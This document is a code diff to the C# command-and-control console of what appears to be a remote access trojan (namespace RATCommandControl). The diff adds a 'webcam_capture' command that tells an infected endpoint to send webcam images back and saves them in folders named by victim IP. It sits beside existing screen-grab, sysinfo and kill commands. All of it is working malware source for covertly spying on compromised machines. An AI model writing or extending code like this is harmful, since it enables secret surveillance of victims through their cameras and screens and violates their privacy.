@@ -65,7 +65,8 @@ namespace RATCommandControl
             Console.WriteLine("Current Endpoints: ");
             for(int i = 0; i < connectedEndPoints.Count; i++)
             {
-                Console.WriteLine("["+i.ToString()+"]   "+connectedEndPoints.ElementAt(i).ToString());
+                IPEndPoint selectedIPEndpoint = associatedHandlers[i].RemoteEndPoint as IPEndPoint;
+                Console.WriteLine("["+i.ToString()+"]   "+selectedIPEndpoint.Address.MapToIPv4().ToString());
             }
         }
 
@@ -81,6 +82,7 @@ namespace RATCommandControl
             commandIndex.Add("kill");
             commandIndex.Add("sysinfo");
             commandIndex.Add("screen");
+            commandIndex.Add("webcam_capture");
             EndPoint selectedEndpoint = null;
             String commandString = null;
             String currentEndpointString = "no endpoint selected!";
@@ -162,10 +164,75 @@ namespace RATCommandControl
                     {
                         screenGrab(selectedEndpoint);
                     }
+                }else if (commandString.Equals("webcam_capture"))
+                {
+                    if(selectedEndpoint == null)
+                    {
+                        Console.WriteLine("Error: No endpoint selected");
+                    }else
+                    {
+                        captureWebcam(selectedEndpoint);
+                    }
+                }
+
+
+
+                else
+                {
+                    Console.WriteLine("Known commands: ");
+                    foreach(String command in commandIndex)
+                    {
+                        Console.WriteLine(command);
+                    }
                 }
             }
             Environment.Exit(0xbeef);
             
+            
+        }
+        static void captureWebcam(EndPoint e)
+        {
+            int endpointIndex = connectedEndPoints.IndexOf(e);
+            Socket usingSock = associatedHandlers.ElementAt(endpointIndex);
+            String query = "c4m";
+            query += (char)4;
+            byte[] queryBytes = Encoding.ASCII.GetBytes(query);
+            usingSock.Send(queryBytes);
+            byte[] recvChunk = new byte[1024];
+            String recvString = null;
+            List<byte> imgBytes = new List<Byte>();
+            bool error = false;
+            while (true)
+            {
+                int recvSize = usingSock.Receive(recvChunk);
+                recvString = Encoding.ASCII.GetString(recvChunk, 0, recvSize);
+                foreach (byte b in recvChunk)
+                {
+                    imgBytes.Add(b);
+                }
+                if (recvString.IndexOf("IEND") > -1)
+                {
+                    break;
+                }
+                else if (recvString.IndexOf("webcamError") > -1)
+                {
+                    error = true;
+                    break;
+                }
+        }
+            if (!error)
+            {
+                var ms = new MemoryStream(imgBytes.ToArray());
+                Image img = Image.FromStream(ms);
+                IPEndPoint clientIPEndpoint = usingSock.RemoteEndPoint as IPEndPoint;
+                System.IO.Directory.CreateDirectory("webcam_" + clientIPEndpoint.Address.MapToIPv4().ToString());
+                img.Save(Environment.CurrentDirectory + "\\webcam_" + clientIPEndpoint.Address.MapToIPv4().ToString() + "\\screenshot" + DateTime.Now.Ticks.ToString() + ".png", System.Drawing.Imaging.ImageFormat.Png);
+                img.Dispose();
+                ms.Dispose();
+            }
+            else{
+                Console.WriteLine("An error occurred while processing data from the webcam.");
+            }
             
         }
         static void screenGrab(EndPoint e) //Slight memory leak here...
@@ -179,6 +246,7 @@ namespace RATCommandControl
             byte[] recvChunk = new byte[1024];
             String recvString = null;
             List<byte> imgBytes = new List<Byte>();
+            
             while (true)
             {
                 int recvSize = usingSock.Receive(recvChunk);
@@ -197,10 +265,11 @@ namespace RATCommandControl
             var ms = new MemoryStream(imgBytes.ToArray());
             Image img = Image.FromStream(ms);
             IPEndPoint clientIPEndpoint = usingSock.RemoteEndPoint as IPEndPoint;
-            System.IO.Directory.CreateDirectory("screenshots_"+clientIPEndpoint.Address.MapToIPv4().ToString());
-            img.Save(Environment.CurrentDirectory+ "\\screenshots_" + clientIPEndpoint.Address.MapToIPv4().ToString()+"\\screenshot" +DateTime.Now.Ticks.ToString()+".png",System.Drawing.Imaging.ImageFormat.Png);
+            System.IO.Directory.CreateDirectory("screenshots_" + clientIPEndpoint.Address.MapToIPv4().ToString());
+            img.Save(Environment.CurrentDirectory + "\\screenshots_" + clientIPEndpoint.Address.MapToIPv4().ToString() + "\\screenshot" + DateTime.Now.Ticks.ToString() + ".png", System.Drawing.Imaging.ImageFormat.Png);
             img.Dispose();
             ms.Dispose();
+            
         }
         static void getSystemInfo(EndPoint e)
         {
